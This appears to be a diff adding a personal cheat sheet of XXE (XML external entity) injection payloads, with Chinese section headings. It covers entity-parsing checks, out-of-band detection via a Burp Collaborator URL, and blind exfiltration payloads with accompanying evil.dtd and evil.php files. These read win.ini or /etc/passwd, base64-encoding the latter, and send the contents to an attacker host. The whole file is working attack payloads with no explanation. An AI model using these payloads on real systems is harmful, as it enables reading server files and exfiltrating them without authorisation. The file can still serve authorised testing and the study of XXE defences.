@@ -1,0 +1,48 @@
+#检测是否解析实体
+（1）
+<!DOCTYPE note [
+<!ENTITY test  "ivan_test">
+]>
+&test;
+
+（2）burp下使用collaborator检测
+<!DOCTYPE note [
+<!ENTITY test SYSTEM "http://0mn5ma5xdjr8h6wiauyk1x4k0b63us.burpcollaborator.net">
+]>
+&test;
+
+#检测是否解析外部实体
+<!DOCTYPE note [
+<!ENTITY test SYSTEM "http://1v4n.sinaapp.com">
+]>
+&test;
+
+
+#
+（1）
+<?xml version="1.0" encoding="utf-8" ?>
+<!DOCTYPE roottag [
+<!ENTITY % file SYSTEM "file:///C:/Windows/win.ini">
+<!ENTITY % dtd SYSTEM "http://ip/evil.dtd">
+%dtd;
+%send;
+]>
+
+#evil.dtd
+<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY % all
+"<!ENTITY &#x25; send SYSTEM 'http://ip/?%file;'>"
+>%all;
+
+（2）
+<!DOCTYPE root [
+<!ENTITY % remote SYSTEM "http://your-domain/evil.php">
+%remote;
+]>
+
+
+#evil.php
+<!ENTITY % payload	SYSTEM	 "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
+<!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'http://1v4n.sinaapp.com/?xxe_local=%payload;'>">
+%int;
+%trick;
